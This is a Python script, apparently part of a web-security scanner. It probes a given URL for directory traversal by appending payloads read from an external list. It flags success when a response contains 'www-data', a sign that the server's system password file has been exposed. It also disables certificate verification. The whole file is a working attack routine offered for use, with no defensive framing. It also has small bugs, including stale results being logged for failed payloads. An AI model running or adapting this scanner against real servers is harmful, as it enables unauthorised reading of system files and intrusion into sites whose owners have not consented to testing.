import concurrent.futures
import validators
import requests
def directoryTraversal(url, output_file, payload_file="Payloads/PayloadDirTrav.txt", headers=None, cookies=None, timeout=5, max_workers=None):
    num_successful, num_unsuccessful = 0, 0
    try:
        if not validators.url(url):
            raise ValueError("Invalid URL format")

        # Read payloads from the specified file
        try:
            with open(payload_file, "r") as file:
                payloads = [line.strip()
                            for line in file.readlines() if line.strip()]
        except FileNotFoundError:
            raise ValueError("Payload file not found")

        results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Check the first payload
            first_payload = payloads[0]
            try:
                request_url = f"{url}/{first_payload}"
                response = requests.get(
                    request_url, headers=headers, cookies=cookies, timeout=timeout, verify=False)

                if response.status_code == 200 and "www-data" in response.text:
                    result = f"[+] Directory traversal possible, payload: {first_payload}"
                    print(
                        f"[+] Directory traversal possible, payload: {first_payload}")
                    num_successful += 1
                else:
                    result = f"[-] Directory traversal not confirmed, payload: {first_payload}"
                    print(
                        f"[-] Directory traversal not confirmed, payoad: {first_payload}")
                    num_unsuccessful += 1
            except requests.exceptions.RequestException as e:
                result = f"[-] Error occurred while checking payload {first_payload}: {e}"

            results.append(result)

            # Check if the user wants to continue with other payloads
            if input("Do you want to check with the rest of the payloads? (y/n): ").strip().lower() == "y":
                for payload in payloads[1:]:
                    try:
                        request_url = f"{url}/{payload}"
                        response = requests.get(
                            request_url, headers=headers, cookies=cookies, timeout=timeout, verify=False)

                        if response.status_code == 200 and "www-data" in response.text:
                            result = f"[+] Directory traversal possible, payload: {payload}"
                            num_successful += 1
                        else:
                            num_unsuccessful += 1
                        #     result = f"[-] Directory traversal not confirmed, payload: {payload}"
                    except requests.exceptions.RequestException as e:
                        result = f"[-] Error occurred while checking payload {payload}: {e}"

                    results.append(result)

        # Write results to the report file
        with open(output_file, "a") as report:
            for result in results:
                report.write(result + "\n")

        # Print a summary of the results

        print(
            f"Scan completed. Successful: {num_successful}, Unsuccessful: {num_unsuccessful}")

    except Exception as e:
        print("Error:", e)

